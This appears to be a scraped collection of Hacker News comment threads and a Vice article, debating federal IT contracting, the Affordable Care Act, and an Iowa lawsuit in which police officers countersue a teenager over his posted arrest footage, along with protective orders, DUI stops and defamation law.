I was under the impression that it was just that the federal gov&#x27;t won&#x27;t pay salaries that are remotely competitive, so the only way they can get work done by competent people is by hiring a contractor who then pays market wages to a consultant. reply nonameiguess 13 hours agorootparentEh, I&#x27;ve worked with a whole lot of incredibly intelligent, talented people in the federal government. If there&#x27;s a problem they have with wages, it&#x27;s more that they can&#x27;t retain the best people any more, but it wasn&#x27;t so much of a problem 20 years ago before Silicon Valley salaries skyrocketed so quickly. The security of the civil service and a guaranteed pension used to make up for the slightly lower pay, but it doesn&#x27;t make up for 1&#x2F;3 the pay. Given it takes a literal act of Congress to change the pay bands and Congress won&#x27;t even fund the existing budget they already passed, they simply can&#x27;t adjust at the speed of industry.But they probably will eventually add a compensating bonus for critical work the way they had to do with medical doctors. Physicians that work directly for DoD make an enormous bonus compared to others in the same pay grade but different career field because otherwise they wouldn&#x27;t be able to hire anyone. They react slowly but eventually react.What you&#x27;re talking about, though, is a problem with procurement procedures. It&#x27;s far easier to get through Congress than any change in operational budget that involves increased pay for federal employees, even if the outcome is otherwise identical. And it frankly makes sense to a large extent. Even if they have to pay way more for a private workforce, they only have to justify it for a several year project. Hire the same number of civil servants and you&#x27;re committing to employing them for the next 30 years. They need to know they&#x27;ll consistently have work for them to do.

Obamacare. [0]• The six employees sued included five executives at the vice-president level and higher, as well as a technical manager who was accused of having conducted a fraudulent demo of the new system&#x27;s capabilities.• The state sought \"only\" some $45 million from the technical manager, as well as amounts ranging from $87 million to $267 million from various Oracle executives.(It seems likely that the state sued the Oracle people personally to \"encourage\" them to cooperate in the discovery process in which the state presumably sought documents, etc., from Oracle.

The year was $200 a month. The next year was $300 a month. The next year was $450 a month.It had some good in it, such as not denying people based on pre-existing conditions (along with the limited period you can get insurance). Capping how much insurance companies can make as a percentage of revenue was a real poison pill that only served to make costs balloon. They have no reason to be more efficient, or to try to clamp down on healthcare costs. The more we all pay, the more they make, and it&#x27;s their only path to do so apart from taking marketshare from a competitor.I think we&#x27;ll probably end up with single-payer sometime, which will be a real mess and a huge amount of money will be wasted for decades. We could fix the insurance system, but it&#x27;d be politically unpopular:Everyone&#x27;s insurance is insurance again. By that, I mean it doesn&#x27;t cover routine care (apart from a yearly physical, just to encourage that), medications, etc. It&#x27;s all very high deductible, possibly with some sort of low income subsidy (that still shouldn&#x27;t go too far).Providers need to publicly list prices, or give good faith estimates for things that aren&#x27;t routine.Cap medication prices to an average of...Canada, UK, Germany, and Japan - or some other list. This wouldn&#x27;t be needed for cheaper drugs but for the ridiculously expensive ones that&#x27;d normally eat up your high deductible in a month.Bam. Done. There&#x27;d be a few years of pain, but you&#x27;d quickly see healthcare prices drop off a cliff as consumers would suddenly care that their clinic&#x27;s sleep study costs $7,000 when the place an hour away only charges $1,500, or that they can do testosterone injections for $20 a month instead of taking a pill that costs $500 a month. reply ffgjgf1 15 hours agorootparentOr just copy the Swiss system (which is entirely privatized, more so than in the US) if you want to maintain a high degree of direct government involvement in healthcare which exists know you could also copy one of the functioning mixed public&#x2F;private systems (like the one in the Netherlands).

Taking it farther can work, and may even help, but those seem to be the things you have to have (though price controls can also be implicit, via monopsony). “Credible threat of more” for the price controls may not work in places less authoritarian than Singapore, so you may have to swing closer to the price-book model of places like Japan, if not just go single-payer. reply spiralx 12 hours agorootparentYup.

Both have cost controls though, which the US lacks. reply IX-103 12 hours agorootparentprevThe argument for having insurers cover routine care is that prevention is cheaper. Ideally insurance companies would gladly pay for that since it would save them money in the long run.The problem is that companies are penalized for long-term thinking. Why pay today when in the future it may be someone else&#x27;s problem. That creates a sort of tragedy of commons among insurers. No one is insurer wants to pay today, but everyone would be better off if all insurers paid. That&#x27;s a known market failure so some government intervention is necessary to improve market efficiency.Unfortunately healthcare ticks a lot of other \"market failure\" boxes in its mode of operation.

It did so by enriching the private insurers who basically run our health care system. Personally I don’t see that as a success, rather it simply made all our health care system problems worse. Access to insurance just isn’t the same as access to health care, because the insurance costs money, and insurers tend to be roadblocks to care. People who tend to need the most care were either already covered (Medicare&#x2F;Medicaid) or the subsidies under ACA were paltry jokes compared to their needs.There isn’t a realistic chance of repeal. Both of the main political parties here benefit from it too much: the democrats by claiming a health care win, which our latte liberal class eats up, and the republicans by having an additional hot button issue (like abortion and guns) to whip their lunatic fringe up with.

When you include fee&#x2F;service ratios for younger cohorts in the Medicare math, the administrative overhead numbers look a lot less compelling; more importantly, you can zero out administrative overhead from insurers and still only get a grocery store discount on services. The immediate problem with American health care is that providers charge too much for services, and secondarily that Americans access too many services.It&#x27;s also important to remember --- though I don&#x27;t think it changes any of the fundamentals of the issue --- that the ordinary \"retail\" care that we access on a year by year basis, including short hospital stays, isn&#x27;t where all the cost in the system is. reply ffgjgf1 15 hours agorootparentHowever insurance companies have absolutely no incentives for pressuring the providers to reduce prices, the opposite in fact because they get to keep a share of the revenue.. reply tptacek 15 hours agorootparentMedicare also pays unacceptably high rates for services; the idea that Medicare would successfully and meaningfully reduce those rates is more aspirational than empirical.

ACA tried to fix that with the \"Three Legged Stool\": guaranteed issuance (no longer could a pre-existing health issue be denied coverage), government subsidies for people who couldn&#x27;t afford it, and the individual mandate (everyone has to buy insurance or pay a fee) to make sure people didn&#x27;t free-ride while healthy and only get insurance when they were sick. There was also a side project, which was this was that subsidies for really poor people turned out to be really expensive, so perhaps it would be easier to have everyone below a certain threshold just get Medicaid (government insurance for poor people that for complicated historical reasons is largely federal but partly each individual state funded- this is distinct from Medicare, which is entirely Federal and offers universal coverage to everyone over 65). So everyone can use the exchanges to get insurance, if they don&#x27;t get insurance they have to pay a fee in their taxes at the end of the year, and Medicaid had expanded eligibility rules to cover more people. Health care wonks largely expected the exchanges to do most of the work, and some of them even envisioned a future where the link between jobs and health care were broken- your job pays you more money and you get insurance on your own through the exchange. But that was a future dream, for the ACA itself the focus was on just getting the exchanges to run. That is what healthcare.gov was all about, matching you to your local exchange and offering you the right plans and subsidy amounts- tying together insurance companies, the IRS for your tax returns, and state IT systems all together.Then the conservative-controlled Supreme Court surprised many, and upheld the ACA exchanges on a 5-4 vote, though they added a random restriction never found before in any Supreme Court ruling that each state would have to accept the Medicaid changes on their own- a rewriting done by the Chief Justice&#x27;s clerks in haste (after he apparently changed his vote late in the game to allow the rest of the law to stay, the liberal wing joined him immediately, no matter how weird it was, much better than losing the whole thing).Now a decade on, the exchanges have proven to not be very popular- everyone who can still gets their insurance through their company because it is seen as a better deal than going through the exchange (because of corporate consolidation on both the insurance company and medical provider sides there is actually very little competition in the exchanges, so the prices didn&#x27;t go down as expected). Far more people are covered by insurance than before, but it was almost entirely because of the Medicaid expansion- slowly over time even red states have gotten into it, and now only 10 states are still holding out, even as their rural hospitals are utterly devastated and many are forced to close because they can&#x27;t get paid for their work (in order to balance the budget within the act, some of the US government programs that used to support poor people without insurance were ended- they&#x27;ll all have Medicaid, so are unnecessary- except then the Supreme Court&#x27;s rewriting meant that many poor people don&#x27;t have Medicaid, and the GOP views even attempts to fix things for their own states as a step too far). The individual mandate- which had been viewed as essential to the success of the exchanges- was zeroed out by the Republicans when they took power, that is, the fee for not having insurance was set to 0. And it didn&#x27;t really have much noticeable effect, because the exchanges didn&#x27;t make much difference in the end, the power turned out to all be in the Medicaid expansion.This in turn is what has driven the more liberal health care wonks towards single-payer and BernieCare and the like: if the exchanges didn&#x27;t have much impact and Medicaid did, why not just make Medicaid-for-all? reply lapcat 15 hours agorootparent> Now a decade on, the exchanges have proven to not be very popular- everyone who can still gets their insurance through their company because it is seen as a better deal than going through the exchangeThis is a rather strange interpretation, because the marketplace was never intended to compete with or replace employer provided insurance. In fact, the ACA has an employer health insurance mandate for companies with at least 50 employees. The marketplace is primarily for people who aren&#x27;t otherwise covered by employer health insurance or Medicaid, such as the self-employed, and I suspect that the marketplace is used by most of those people, especially because of the income-based subsidies. reply mandevil 14 hours agorootparentLike I said, a lot of health care policy wonks in 2010 were definitely expecting the exchanges to be where the action was, and were talking about future changes that would allow employer subsidies onto the exchange or for higher wages in exchange for breaking the link totally (health care wonks have long hated the link between employment and health insurance- it&#x27;s a weird legacy of WW2 that doesn&#x27;t make sense). This is why Congress and their legislative staffers are the only people who do have employer subsidies on the exchange- the GOP offered a poison pill to force Congress to only be offered insurance through the DC exchange, but the Dems gladly accepted the pill because they thought it would mark the way to the future. This did require a lot of extra rule-making and pipe-fitting such that the (quite poorly paid) staffers didn&#x27;t get screwed too badly on the deal, which took an extra year, but since 2015 Congress has only been offered health insurance through the DC Exchange, the same as anyone else who lives in DC. Because the GOP thought it would embarrass the Dem&#x27;s and the Dems thought it would instead mark the way that everyone would go. reply lapcat 12 hours agorootparent> a lot of health care policy wonks in 2010 were definitely expecting the exchanges to be where the action was, and were talking about future changesOk, but... how are the dreams of \"policy wonks\" relevant? What we got is what Congress passed, and what Congress passed preserved and enshrined the role of employers in providing health insurance. Thus, the fact that people who have employer-provided health insurance are not on the exchanges doesn&#x27;t seem interesting, given the actual laws in place (as opposed to some imagined future alternative).And I think you&#x27;re underestimating the number of people who don&#x27;t have employer-provided health care and who do use the exchanges, especially with the so-called \"gig economy\".> This is why Congress and their legislative staffers are the only people who do have employer subsidies on the exchangeCongress granting itself an exception is just par for the course. reply spiralx 11 hours agorootparentprevYou have to remember that originally those exchanges would also have had a public option available to compete with private plans. replylifeisstillgood 10 hours agoprevAnd every single part of that \"rescue\" would never have been needed if the original team had been allowed to \"do things the normal standard way\" the first time.We can guess the reasons - everyone and their dog wanted to be part of the flagship IT project, a slew of conflicting interests and parties who would not talk to each other or in some cases were actively sabotaging efforts, a failure to recognise that \"working complex systems only ever evolve out of simple working systems\".Why do we always do this to ourselves ? reply eyphka 6 hours agoprevThis was a fantastic read and looking forward to reading more.

The officers initially alleged they experienced &#x201C;emotional distress&#x201D; and are now suing for defamation and invasion of privacy.&#xA0;&#xA0;The lawsuit, first reported by the Iowa Capital Dispatch last week, comes as a counterclaim to a federal lawsuit filed by the teenager earlier this year, alleging he was falsely arrested and that his civil rights had been violated.&#xA0;AdvertisementTayvin Galanakis sued Iowa&#x2019;s Newton Police Department in February for a violation of his Constitutional rights, false arrest, and &#x201C;negligent supervision and training&#x201D; by the county. His lawsuit states that in late August of 2022, he was pulled over by officer Nathan Winters and Lieutenant Christopher Wing for not dimming his high beams to oncoming traffic. Galanakis was 19 at the time.Body-cam footage posted to YouTube by Galanakis is titled \"Police Wrongfully Arrest 19 Year Old During Traffic Stop\" and has 2 million views. In it, the officers said they pulled Galanakis over for having his brights on within the city limits. About four minutes into the encounter, Winters asked Galanakis how much he had had to drink that night, claiming his eyes were &#x201C;watery and bloodshot&#x201D; and that he could smell the &#x201C;odor of alcohol.&#x201D; The officers proceeded to perform a variety of field sobriety tests on Galanakis, including walking in a straight line and standing on one foot and counting to three. The officers performed a breathalyzer test, which showed Galanakis had a blood-alcohol content of 0.00. After that, the officers accused Galanakis of smoking cannabis based on the field sobriety test. Winters then arrested him.&#xA0;&#x201C;He bombed sobriety,&#x201D; Winters says on the phone, around 19 minutes into the body-cam footage posted to YouTube, noting that Galanakis blew &#x201C;triple zeros.&#x201D; A subsequent evaluation at the police station found no evidence of alcohol or drugs in Galanakis&#x2019;s system, and he was released.&#xA0;AdvertisementAround two weeks after the arrest, Galanakis posted the footage to YouTube with his own commentary added as captions. The two arresting officers claimed those captions, as well as clips and statements Galanakis posted to TikTok and Facebook, constituted defamation and &#x201C;intentional infliction of emotional distress.&#x201D; The officers&#x2019; lawsuit claims that Galanakis had &#x201C;publicly posted knowingly false and shocking statements&#x201D; about both officers&#x2019; &#x201C;training, experience, and qualifications to be a certified law enforcement officer,&#x201D; as well as &#x201C;mocked the mental fitness and capacity&#x201D; and &#x201C;questioned the competence, fitness, and moral character&#x201D; of both officers.&#xA0;This is not the first time cops have sued civilians for posting videos of them. After an Ohio police department raided rapper Afroman&#x2019;s house on suspicion of drug possession and kidnapping, Afroman released an album about the raid, using security camera footage from his house in the music videos. The cops sued him for emotional distress, and said that they had suffered &#x201C;embarrassment, ridicule, [and] humiliation.&#x201D;It quotes Galanakis as posting on Facebook that he &#x201C;[didn&#x2019;t] even want to refer to him as officer winters, this guy is on the slow side of the spectrum,&#x201D; and that &#x201C;he sounded like a little kid who was roll playing [sic] a cop during recess. I&#x2019;m thinking in my head no way this guy pass training.&#x201D; Another post is quoted as stating that both officers had &#x201C;performed horribly that night.&#x201D;AdvertisementCaptions in the YouTube video that the counterclaim quoted read that Wing &#x201C;sounds like he&#x2019;s faded asl [as hell],&#x201D; and that Galanakis had been &#x201C;kidnapped then raped by the NPD all night.&#x201D;The lawsuit claims that such statements caused the officers &#x201C;to suffer: pain and suffering, mental anguish, loss of enjoyment of life, loss of community reputation, loss of employability, [and] loss of time and inconvenience bringing this action.&#x201D;&#xA0;Neither party&#x2019;s legal team responded to a request for comment.In two decisions in May and September, U.S. District Judge Stephen Locher dismissed almost all of the officers&#x2019; claims. Locher deemed most of Galanakis&#x2019;s captions as &#x201C;non-actionable statement[s] of opinion&#x201D; or &#x201C;rhetorical hyperbole,&#x201D; which are both considered non-defamatory. This included the caption where Galanakis said he was &#x201C;raped&#x201D; by the police department, which Locher said was &#x201C;distasteful,&#x201D; but non-actionable.&#x201C;As to most of the statements identified in his counterclaims, Winters has not alleged sufficient facts to allow a reasonable viewer to conclude that they are capable of defamatory meaning,&#x201D; Locher wrote in the first of the two decisions. He writes that most of the statements referenced &#x201C;simply summarize what was happening in corresponding video footage. Wing does not explain how a reasonable listener could have construed these statements as &#x2018;false,&#x2019; much less why they might have defamatory meaning.&#x201D;&#xA0;The only counts Locher has not dismissed are defamation and invasion of privacy against the officers related to Galanakis' claim that Winters had been convicted of domestic abuse. &#x201C;Nathan Winter of the Newton Police Department convicted of domestic abuse after beating up his ex girlfriend,&#x201D; Galanakis wrote in one caption. A subsequent caption stated that Winters had &#x201C;beat the shit out of&#x201D; his girlfriend. Though Winters had a protective order filed against him, the counterclaim states that he has not been charged or convicted of domestic abuse. Locher agreed that on this basis claims of defamation and false-light invasion of privacy for both Winter and Wing (because of the implication that Wing did nothing to discipline Winters) can proceed.&#xA0;There is yet no set date for a trial, though the parties are expected to file an update to the court on October 20.Tagged:tayvin galanakisYouTubearrestpolicecopslawsuitORIGINAL REPORTING ON EVERYTHING THAT MATTERS IN YOUR INBOX.Your Email: SubscribeBy signing up, you agree to the Terms of Use and Privacy Policy & to receive electronic communications from Vice Media Group, which may include marketing promotions, advertisements and sponsored content.AdvertisementAbout JobsPartnerVICE VoicesContent Funding on VICESecurity PolicyPrivacy & TermsAccessibility Statement© 2023 VICE MEDIA GROUP{\"props\":{\"pageProps\":{\"data\":{\"articles\":[{\"__typename\":\"Article\",\"id\":\"653122ff0c922fdb074f2d40\",\"body_components_json\":\"[{\\\"id\\\":\\\"6531760d5132549f5dba3fac\\\",\\\"version\\\":\\\"1\\\",\\\"position\\\":0,\\\"role\\\":\\\"body\\\",\\\"html\\\":\\\"Two Iowa police officers are suing a teenager they arrested last year after the \\u003ca href=\\\\\\\"https://www.youtube.com/watch?v=so_bFYoIsow\\\\\\\"\\u003e\\u003cspan\\u003ebody-cam footage of the allegedly unwarranted arrest\\u003c/span\\u003e\\u003c/a\\u003e he posted on YouTube went viral.

There was zero evidence for this raid and they still destroyed his property and disabled his cameras. reply salamanderss 19 hours agoparentprevFWIW those DV TPO are handed out like candy and not evidence of anything. David Letterman had one for bit because a lady (he didn&#x27;t know, in a different state) accused him of sending her secret abusive messages through his TV program. It&#x27;s kind of insane to depend on that for an opinion let alone stuff like constitutional rights. reply giraffe_lady 18 hours agorootparentAn emergency protective order is usually given with no verification because it&#x27;s much better to give one out incorrectly then to fail to give when you you should have.But those are only pending a court date, a few weeks at most. A \"real\" one is issued by a judge after interviewing both parties (or by default if one doesn&#x27;t show up) and those are very reliably real. I don&#x27;t know anything about the letterman thing.

Therefore, they are extremely likely just to issue a PPO \"just because.\"> The real ones though are very reliable indicators that something fucked up went down.TPOs&#x2F;PPOs are absolutely not reliable: In most states, they are civil and issued subject to a preponderance of the evidence and not beyond a reasonable doubt. Evidence is not subject to any verification or real evidentiary standards: you could fake text message screenshots all day long and net a PPO before you ever had an issue with perjury.FWIW: someone with ill&#x2F;violent intent couldn&#x27;t care less about a random status violation that would pale in comparative severity to whatever other crime they wanted to commit. reply enragedcacti 17 hours agorootparent> FWIW: someone with ill&#x2F;violent intent couldn&#x27;t care less about a random status violation that would pale in comparative severity to whatever other crime they wanted to commit.Violence in general and domestic violence especially are not always premeditated. What starts as an attempt by the abuser to hash things out can devolve into violence. A protective order can stop abusers from making the attempt in the first place, and when there is an attempt they can help the victim get more immediate help from law enforcement. reply salamanderss 17 hours agorootparentAnd of course nothing calms an abuser down like being set loose without a proper conviction, now with the ire of being dispossessed perhaps rightly of children and home.Convict and jail them, with the full rights and penalties that go with that. Not this halfass paper shield against an otherwise free person. reply enragedcacti 16 hours agorootparent> And of course nothing calms an abuser down like being set loose without a proper conviction, now with the ire of being dispossessed perhaps rightly of children and home.Absolutely, some murders do seem to be triggered by protection orders. Presumably those cases would also occur when they are charged with a crime with cooperation from the victim. Are we going to instead consider pretrial detention for all cases of accused DV? And wouldn&#x27;t that have all of the same issues with a lower standard of evidence but infringe even more on their rights?Edit: I should clarify, when charges are filed we should consider pretrial detention. Unfortunately there are tons of reasons why DV victims often end up not wanting to press charges, or when someone is charged, not wanting to cooperate with prosecutors. Creating a situation where their only avenue for safety is pressing charges and cooperating with authorities creates its own set of issues and I feel they still deserve some level of safety even if they don&#x27;t cooperate with criminal charges. reply lelanthran 16 hours agorootparent> Are we going to consider pretrial detention for all cases of accused DV? And wouldn&#x27;t that have all of the same issues with a lower standard of evidence but infringe even more on their rights?I think we should.The reason permanent orders are handed out like candy is because the judge wants to err on the side of caution. It&#x27;s the same reason cops are more willing to use force when they have a taser than when they have a gun - there&#x27;s no consequences for doing so.Make there be real consequences for wrongly issuing a protection order, and you&#x27;ll have fewer wrongly issued protection orders. reply salamanderss 16 hours agorootparentprevAbout everywhere I&#x27;ve lived police will absolutely arrest and book upon probable cause of criminal DV and they&#x27;re often required to by law or policy. Yes we should absolutely consider pretrial detention. In my state refer to ARS 13-3883 and note it pertains to criminal justice instead of civil, which are significantly different with different standards than an ex parte civil order.If someone is an abuser by all means take advantage of criminal justice system .Note: not legal advice reply 15155 17 hours agorootparentprevIs this opinion, professional expertise? reply enragedcacti 17 hours agorootparentWhy not just address the point?

TPOs are often issued without the targeted party being contacted or having a chance to defend themselves. PPOs tried in family court do not have a “reasonable doubt” requirement; they are regularly granted without substantive evidence or signs of physical abuse. No judge wants to read about somebody being killed after they denied the PO. reply 15155 16 hours agorootparent> not sure why you are being downvoted.A quick graph analysis of the upvoters&#x2F;downvoters on each comment and then clustering those across historical posts would probably elucidate this reason.> No judge wants to read about somebody being killed after they denied the PO.A judge or magistrate suffers no penalty for issuing a PPO but can suffer great ridicule when this exact situation happens: how is it not obvious that this would perversely inflate the numbers? reply FireBeyond 18 hours agorootparentprev> A \"real\" one is issued by a judge after interviewing both parties (or by default if one doesn&#x27;t show up) and those are very reliably real.Why? Based on one party being able to tell a more convincing story than another? reply giraffe_lady 17 hours agorootparentYes. Assuming you&#x27;re willing to purjure yourself, this is basically the full time job of a family court judge and they&#x27;re much more practiced at figuring it out than a normal person would be.You&#x27;d be hard pressed to find a person with less confidence in our \"justice\" system than I have. And as I mentioned in another comment, I have, unlike almost everyone else here, actually been on the receiving end of a misuse of this system. I still find it overall pretty reliable and the best mechanism we currently have for reducing intimate partner violence, one of the most common ways for women to be murdered. reply FireBeyond 17 hours agorootparent> this is basically the full time job of a family court judge> You&#x27;d be hard pressed to find a person with less confidence in our \"justice\" system than I have.I was \"mandated\" into \"optional\" pretrial mediation by a District Court when my stepdaughter was in a car accident.The mediator, who said she was a Family Court judge when introducing herself, among several other problematic things, attempted to write a mediation agreement where -I- was purportedly binding not just myself but my insurance carrier to several things, with language like \"FireBeyond agrees that Insurer or himself will pay X by date Y. He agrees that he and insurer will be in default if they do not\", etc. And when I stated that I had no authority to agree on behalf my insurance carrier to binding agreements, she was frustrated and exasperated that I was correcting her&#x2F;objecting to her language.I&#x27;ve also lived in a place where it was settled Family Court precedent that men could be (and were often found to be) liable for child support for children that were not theirs, in marriage or out, by virtue of the fact that they were in a relationship with the mother at the time of birth and beyond (regardless of awareness of progeny).Please do not mistake this for a lack of sympathy for what I see as unacceptable levels of intimate partner violence and our poor handling of it, because as a paramedic who sees far more of it than I should, I am not. It is difficult at times to find a nuance with which to criticize the family court without coming across MRA&#x2F;incel&#x2F;redpilly. reply 15155 17 hours agorootparentprevIt&#x27;s civil court: can you please give me some Lexis cites on any case you are aware of for someone being prosecuted for perjury incident to evidence forged in a PPO hearing?I&#x27;ve witnessed 100+ of these hearings: they are a disgrace to our justice system.

Suppose someone yells and screams at you and threatens to hurt you. You call the police. Unless you&#x27;ve got injuries or recordings, what are the police going to do? Without hard evidence it&#x27;s just a he said&#x2F;she said and is unlikely to even end up with charges. Even if you have recordings, unless it&#x27;s a specific threat that isn&#x27;t a crime. But you then go to a court for a TPO. This person shows up again, screaming and yelling and threatening you. You call the police and they show up. Now all you have to do it point to the person standing in your front yard, and point to the TPO, and that&#x27;s the case. reply bscphil 17 hours agorootparentprev> It&#x27;s wonderful that they may have helped you at one point.That&#x27;s not what they said, you&#x27;re misreading.> Can we please see some formal, peer-reviewed evidence to suggest that someone willing to commit murder is going to be deterred by a DUI-equivalent?I did a very quick search using neutral terms for studies on this. Here are the first three I found.> PO victims had police incident rates that were more than double the matched group prior to the PO, but dropped to the level of the matched group during and after the order. https:&#x2F;&#x2F;www.ncbi.nlm.nih.gov&#x2F;pmc&#x2F;articles&#x2F;PMC4151113&#x2F;> Results showed significant reductions in threats of assault, physical assault, stalking, and worksite harassment over time among all women, regardless of receipt or nonreceipt of a protection order. https:&#x2F;&#x2F;www.ncbi.nlm.nih.gov&#x2F;pmc&#x2F;articles&#x2F;PMC1448307&#x2F;> Permanent, but not temporary, protection orders are associated with a significant decrease in risk of police-reported violence against women by their male intimate partners. https:&#x2F;&#x2F;jamanetwork.com&#x2F;journals&#x2F;jama&#x2F;fullarticle&#x2F;195163That last one had a pretty good study size - 2691 women.I don&#x27;t think it&#x27;s incredible that a protective order could stop an expanding pattern of abuse and violence before it becomes severe enough for a murder to occur. You say \"someone willing to commit murder\", and it&#x27;s probably true that if the culprit is already very willing or actively intending to commit a murder, a protective order is useless. Abusers cannot be placed into permanent \"murderous\" and \"non-murderous\" groups, though. reply fkyoureadthedoc 17 hours agorootparentprev> an you please give me some Lexis cites on any caseWhy are you holding other people to higher standards than yourself, when making equal if not stronger claims? reply jahewson 16 hours agorootparentprevI&#x27;m sure they&#x27;re trying to do a good job but it&#x27;s concerning that only the false negatives are visible, what&#x27;s the false positive rate? reply 15155 17 hours agorootparentprevBased on whatever fake text message screenshots, sob story, crying children, paid witnesses can convince the judge that some potential threat exists beyond a preponderance of the evidence. reply lelanthran 16 hours agorootparent> Based on whatever fake text message screenshots, sob story, crying children, paid witnessesYou don&#x27;t need any of that.

So Chauvin should have been required to check for consciousness and then provide aid once finding Floyd to be in medical distress. reply threatofrain 2 hours agorootparentWhat Chauvin and fellow officers did was already in violation of policy.

IN 1969, THE MENLO PARK POLICE FORCE CHANGED FROM THE TRADITIONAL MILITARISTIC UNIFORM TO BLAZERS AND TIES, MORE IN KEEPING WITH CIVILIAN MODES OF DRESS. RANK WAS NOT EXHIBITED, NIGHTSTICKS WERE DISPENSED WITH, AND GUNS WERE WORN BENEATH THE BLAZER. RESULTS OF THIS NEW POLICE IDENTITY INCLUDE PEER GROUP ISOLATION, INCREASED INVOLVEMENT IN EDUCATION, INCREASED RECRUITMENT OF INDIVIDUALS WITH COLLEGE DEGREES, AND A DECREASE IN PERSONNEL TURNOVER. A 1971 COMPARATIVE STUDY OF THE MENLO PARK POLICE AND TWO OTHER DEPARTMENTS IN THE AREA INDICATED A DECREASED NEED FOR A SYMBOL OF AUTHORITY AND IMPROVED POLICE-COMMUNITY RELATIONS IN MENLO PARK.

How would they interpret this? reply autoexec 16 hours agorootparent> But publicly claiming someone did something like best their wife when their is no proof is potentially defamation.Studies have shown that 40% of cops beat their wives, and other research suggests that DV doesn&#x27;t get reported at all roughly half of the time, so the number of police officers beating their wives is going to be much greater than 40%. For any random police officer you could claim they beat their wives and be right more often than not. It&#x27;s not an entirely unfair assumption to start with. This officer&#x27;s ex had a protective order against him granted by the district court which was then extended on at least three occasions. It might not be proof of abuse, but it&#x27;s pretty strong evidence.My guess is that this kid found information about the protective order and just got his terminology wrong, assuming that there was a conviction when there wasn&#x27;t one. It&#x27;s statistically likely that he wasn&#x27;t wrong and abuse was taking place. Seems like the courts could give some slack to the teenager whose rights were violated by a corrupt cop who likely abused his ex even if there was never a conviction. reply bequanna 16 hours agorootparentThat’s not the point of statistics like that.

I&#x27;m just saying that it&#x27;s a lot less unreasonable to accuse this cop of beating his ex than it would be to pick a random person on the street and accuse them of the same.He was clearly wrong about the conviction, there&#x27;s a pretty good chance he wasn&#x27;t wrong about the abuse. Maybe that&#x27;s a good enough standard of evidence to demand from the youtube video of a justifiably pissed off 19 year old? It&#x27;d be best if he uploaded a correction, or even a corrected re-upload of his video, but I think it&#x27;s fair to say that this kid has been screwed over by the legal system enough already.

The preliminary breath test is one of these tools, and in most (possibly all?) states it is voluntary & not admissible as evidence. You can look your own state&#x27;s laws up, but here&#x27;s a deep dive from Wisconsin on their laws[1].If the police establish probable cause of intoxication because you volunteered to take a field sobriety test &#x2F; preliminary breath test, because of their description of your physical condition (bloodshot&#x2F;glassy eyes) or circumstances (open container, scent of marijuana), you&#x27;ll be arrested & compelled to perform an evidentiary breath test on a stationary machine in a police station, or provide a blood sample to test for intoxication. And this is not a voluntary test – your refusal to provide an evidentiary test is considered evidence that you committed a DUI and you will be penalized accordingly.So in general: it&#x27;s almost best to keep your interactions with the police limited & refuse any voluntary tests to prevent probable cause from being built.[1]: https:&#x2F;&#x2F;www.wisbar.org&#x2F;NewsPublications&#x2F;WisconsinLawyer&#x2F;Page... reply beeburrt 16 hours agoparentprevYou get a Driving Under the Influence charge and everything that comes with it: suspended license, fines, etc. if there are traces in your blood, even if the traces are days&#x2F;weeks old.

If you&#x27;re screwing up behind the wheel and the cops don&#x27;t think you&#x27;re safe to drive you should get a ticket and be driven home or arrested (depending on the circumstances).I&#x27;m all for pulling dangerous drives off the roads, but it seems like a lot of people busted for DUI aren&#x27;t pulled over because they were clearly a danger to others.

All to punish someone the DA has no reason to care about because it wasn&#x27;t even anything to do with the DA&#x27;s authority or the authority of their job?A corrupt DA might knowingly prosecute an innocent person if they think they can make it stick because winning a car is good for thrm, but why would they go out of their way to do something possibly detrimental without reason? reply swores 17 hours agorootparentWell the reason could be doing the police a favour because you like them just as easily as doing it because they&#x27;ve threatened you.I guess if the DA is worried about the police punishing them by not supplying you good cases, or whatever else, enough to give in to that then it&#x27;s kind of irrelevant whether they would also want to do the favour anyway for a cop they liked (or just for the principle of supporting your crime-fighting sibling agency) or not. But it&#x27;s possible that a DA who feels confident that the police wouldn&#x27;t treat them differently in the future if they said no (or who didn&#x27;t care about that threat) might still say yes for the different reason of thinking that police always need backing up &#x2F; that if they disliked this guy enough to fuck with him then it must be because the guy deserves it. reply kbenson 13 hours agorootparentYes, but outlining one way in which DA&#x27;s might feel pressured to do what the police prefer even if it&#x27;s not strictly supported by the law does not \"imply that the only time DAs participate in gratuitous punishment of citizens is when cops threaten their careers\". It only implies that&#x27;s one way or reason why they might do that.That may seem pedantic, but I think it&#x27;s very important when it comes to having useful and rational discussions. If anyone isn&#x27;t seeing that, replace \"DA\" with a minority if your choice and \"gratuitous punishment of citizens\" with any other negative behavior, like theft or crime, and try to explain what the difference is between the statements. If we can&#x27;t follow the same rational when assessing behavior of groups we have favorable or unfavorable predisposed opinions towards, then we can&#x27;t even discuss effectively. reply Gibbon1 14 hours agorootparentprevYou don&#x27;t need to convince a pig to roll in mud. reply szundi 18 hours agorootparentprevThanks for this simple and thourogh answer reply jcranmer 18 hours agorootparentprevDefamation requires negligence (if the plaintiff is not a public figure) or actual malice (if the plaintiff is a public figure).

It instead requires that the defamer have seriously entertained doubts about the truth of the statements, and published them anyways.In this case? I&#x27;d have a hard time finding them defamatory were I on the jury. One of the statements is alleging that the cop is a \"convicted\" domestic abuser, where the truth is that he has a protective order placed against him in relation to alleged domestic abuse yet has never been charged nor convicted.

But you&#x27;d be on a lot firmer ground if you walked it back as soon as you were corrected.However, when you get to the point of specifically say the guy \"beat the shit out of\" his ex-girlfriend, you&#x27;d better have a good reason for believing that. Or if you have an iffy reason, you better say what the reason is, not just state the conclusion as fact. It sounds like the kid had no idea what was actually going on. reply Guvante 18 hours agorootparentA restraining order for domestic abuse being referred to as \"best the shit out of\" sounds like a pretty bog standard simplification to me. After all colloquially how else do you define domestic abuse?Exaggerating for emphasis doesn&#x27;t usually qualify for negligence. reply Hizonner 18 hours agorootparentWhen I legally separated from my ex-wife in California, as I recall we had to check a box not to get restraining orders. Otherwise restraining orders would have been issued, I think against both of us, without either one even having to make any claim about any abuse or any risk thereof. Check the wrong box, automatic restraining order.That may not be what&#x27;s meant by \"protective order\", but at a minimum you should be able to get a protective order against somebody who, for example, threatened violence without actually doing it. That might be evidence of a bad temper or bad judgement or just general assholeism, but that is a long, long way from \"beating the shit out of\" somebody. Well out of \"emphasis\" range.On edit: Oh, and really you could get the order just by saying that the person threatened you, whether they really did or not. So the order is really only proof that there was an allegation, not even so much as a nasty word. reply Guvante 17 hours agorootparentNegligence of the truth is the standard.Being wrong is not sufficient for a defamation case.All of these mistakes make the statement wrong and not factual but that isn&#x27;t enough for a defamation case.My point is if it was a simple mistake or misunderstanding that is enough to prove it 